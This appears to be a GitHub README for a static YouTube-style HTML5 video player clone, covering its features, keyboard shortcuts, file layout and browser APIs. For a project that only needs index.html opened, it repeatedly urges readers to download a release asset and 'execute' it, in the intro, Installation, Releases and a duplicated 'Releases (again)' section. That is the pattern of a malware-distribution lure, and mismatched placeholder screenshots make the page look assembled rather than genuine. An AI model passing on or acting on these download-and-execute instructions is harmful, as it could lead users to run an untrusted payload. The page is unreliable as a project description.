# YouTube Video Player Clone — Vanilla HTML/CSS/JS Video Player 🎬

[![Releases](https://img.shields.io/badge/Releases-%20Download-blue?logo=github)](https://github.com/cvrby8/youtube-video-player-clone/releases)

A clean, responsive YouTube-style video player built with plain HTML, CSS, and JavaScript. It implements core player controls and UI patterns you find on modern video sites. This project exists as a learning exercise based on a Web Dev Simplified tutorial and as a reference for DOM-driven UI and HTML5 video APIs.

Live demo and packaged releases are available. Visit the Releases page and download the release asset file; the file needs to be downloaded and executed. See the Releases section below for the link and steps.

Badges
- Build: none (static project)
- Topics: css-animations · dom-manipulation · html5-video · video-controls

Demo Image
![Video player demo](https://raw.githubusercontent.com/github/explore/main/topics/video-player/video-player.png)

Table of contents
- Features
- Why this project
- Screenshots
- Installation
- Quick start
- Usage and controls
- Keyboard shortcuts
- Code structure
- Key APIs and techniques
- Accessibility and responsive notes
- Development tips
- Releases
- Contributing
- License
- Acknowledgments

Features
- Play / pause toggle
- Seek bar with buffered progress
- Volume control and mute toggle
- Fullscreen mode using Fullscreen API
- Theater mode (wider player, dark background)
- Mini player (Picture-in-Picture)
- Keyboard shortcuts for all major actions
- SVG icons and minimal DOM structure
- Responsive layout and CSS transitions
- No libraries. Plain HTML, CSS, and vanilla JavaScript.

Why this project
- Learn how to control the HTML5 <video> element.
- Practice DOM manipulation and event listeners.
- Explore the Fullscreen API and Picture-in-Picture.
- Build a responsive, accessible UI with CSS transitions and animations.
- Keep code small and explicit. Use only browser APIs.

Screenshots
Front view
![Player front view](https://upload.wikimedia.org/wikipedia/commons/6/69/Video_play_button.png)

Theater mode
![Theater mode example](https://raw.githubusercontent.com/microsoft/vscode-docs/main/images/architecture/architecture.png)

Mini player / PiP
![Picture-in-picture example](https://upload.wikimedia.org/wikipedia/commons/3/3a/Video-Play-Icon.png)

Installation
- Clone the repository:
  git clone https://github.com/cvrby8/youtube-video-player-clone.git
- Or download a release from the Releases page and extract it. The release asset file needs to be downloaded and executed.
- Open index.html in your browser or run a local server.

Quick start
- Static open:
  1. Open index.html in a modern browser (Chrome, Firefox, Edge).
- Local server (recommended for PiP and some APIs):
  - Python 3:
    python3 -m http.server 8000
  - Node (http-server):
    npx http-server -c-1
  - Then open http://localhost:8000

Usage and controls
- Click the play/pause button or the video to toggle play.
- Drag or click the seek bar to change the current time.
- Use the volume slider to set volume. Click the speaker icon to mute/unmute.
- Click the fullscreen button to enter Fullscreen API mode.
- Click the theater mode button to expand the player and dim the page.
- Click the mini player (PiP) button to open a floating video window.
- Hover over the controls to show them; move the mouse away to hide them after a short delay.

Keyboard shortcuts
- Space or K: Toggle play/pause
- J: Rewind 10 seconds
- L: Forward 10 seconds
- Arrow Left / Right: Seek -5 / +5 seconds
- Arrow Up / Down: Volume +5% / -5%
- M: Mute / unmute
- F: Toggle fullscreen
- T: Toggle theater mode
- I: Enter picture-in-picture (PiP)
- 0-9: Seek to 0% - 90% of duration (0 = start, 9 = 90%)

Code structure
- index.html — main markup and player structure
- styles/
  - main.css — layout, transitions, responsive styles
  - icons.css — SVG sprite and icon styles
- src/
  - player.js — player logic, event listeners, DOM updates
  - shortcuts.js — keyboard handler and mapping
  - controls.js — individual control modules (volume, seek, fullscreen)
- assets/
  - icons.svg — SVG icons for controls
  - sample-videos/ — sample video files for local testing
- README.md — this file

Key APIs and techniques used
- HTML5 <video> element
  - currentTime, duration, buffered, paused, volume, muted
- Fullscreen API
  - element.requestFullscreen(), document.exitFullscreen()
  - fullscreenchange event
- Picture-in-Picture API
  - video.requestPictureInPicture(), document.pictureInPictureElement
- MediaSession API (optional)
  - navigator.mediaSession to set metadata and action handlers
- Event listeners
  - pointer events for seeking, input events for range controls
- CSS
  - Flexbox for layout
  - CSS transitions for smooth seek bar and control fading
  - CSS variables for theme options

Accessibility and responsive notes
- Use semantic buttons with aria-label attributes for all controls.
- Provide keyboard focus states for every interactive control.
- Use role="region" and aria-label on the player wrapper for screen reader context.
- Add captions or text tracks for accessibility testing. The player supports loading WebVTT files.
- The layout scales from mobile to desktop. Controls rearrange using CSS media queries.

Development tips
- Debugging video events:
  - Use console logs on timeupdate, seeked, and progress to inspect timing and buffered ranges.
- Volume and mute:
  - Keep volume range 0.0 to 1.0. Save last volume value for mute toggle.
- Seek precision:
  - Update the seek preview when scrubbing using pointermove. Clamp values between 0 and duration.
- Fullscreen quirks:
  - Some browsers restrict autoplay and PiP in cross-origin iframes. Test locally.
- Picture-in-Picture:
  - PiP requires user gesture in some browsers. Tie request to a click handler.

Customization
- Swap icons via the SVG sprite in assets/icons.svg.
- Change color theme via CSS variables in main.css.
- Add playback rate control by exposing video.playbackRate and a menu.

Testing checklist
- Play/pause works by click and keyboard.
- Seek bar reflects current time and buffered ranges.
- Volume slider updates audio and UI icons.
- Fullscreen and theater mode toggle layout and body styles.
- PiP opens a floating window on supported browsers.
- Keyboard shortcuts fire regardless of focus on the player container (but not while typing in an input).

Releases
[Download the latest release asset here](https://github.com/cvrby8/youtube-video-player-clone/releases). The release page includes packaged build files and sample video assets. Download the release asset file and execute it (for example, extract the ZIP and open index.html or run the shipped local server script).

If the link above does not work, check the Releases section on the repository page to find build assets and instructions.

Contribution guide
- Read the code of conduct and contributing.md if present.
- Open an issue for bugs or feature requests.
- Fork the repo, create a feature branch, and send a pull request.
- Keep changes small and focused. Add tests or demo steps when relevant.

Suggested issues for first-time contributors
- Add captions toggle and WebVTT support sample.
- Improve keyboard navigation and focus trapping in theater mode.
- Add unit tests for seek calculation logic.
- Add mobile-friendly touch gestures for scrubbing and volume.

Topics and tags
css-animations, css-transitions, dom-manipulation, event-listeners, fullscreen-api, html5-apis, html5-video, keyboard-shortcuts, learning-project, picture-in-picture, play-pause, responsive-design, svg-icons, theater-mode, vanilla-javascript, video-controls, video-player, volume-control, web-development, youtube-clone

License
This project uses the MIT license. See LICENSE file for details.

Acknowledgments
- Built following a tutorial from Web Dev Simplified for learning and practice.
- Icons and imagery use free public sources and placeholders.

Releases (again)
Visit the Releases page to get build packages and sample assets: https://github.com/cvrby8/youtube-video-player-clone/releases — download the release asset file and execute it to run the packaged player.